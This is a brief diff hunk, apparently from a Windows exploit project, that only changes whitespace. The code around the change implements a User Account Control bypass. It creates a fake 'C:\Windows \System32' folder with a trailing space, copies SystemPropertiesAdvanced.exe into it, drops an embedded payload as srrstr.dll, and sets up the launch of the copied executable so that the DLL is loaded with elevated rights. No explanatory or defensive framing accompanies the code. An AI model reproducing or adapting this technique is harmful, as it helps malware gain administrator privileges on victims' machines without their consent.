@@ -2,7 +2,7 @@
 	CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", nullptr);
 	CopyFileW(L"C:\\Windows\\System32\\SystemPropertiesAdvanced.exe", L"\\\\?\\C:\\Windows \\System32\\SystemPropertiesAdvanced.exe", false);
 	DropResource(MAKEINTRESOURCE(IDR_DATA1), L"DATA", L"\\\\?\\C:\\Windows \\System32\\srrstr.dll");
-  _SHELLEXECUTEINFOW se = {};
+  	_SHELLEXECUTEINFOW se = {};
 	se.cbSize = sizeof(_SHELLEXECUTEINFOW);
 	se.lpFile =  L"C:\\Windows \\System32\\SystemPropertiesAdvanced.exe";
 	se.lpParameters = nullptr;
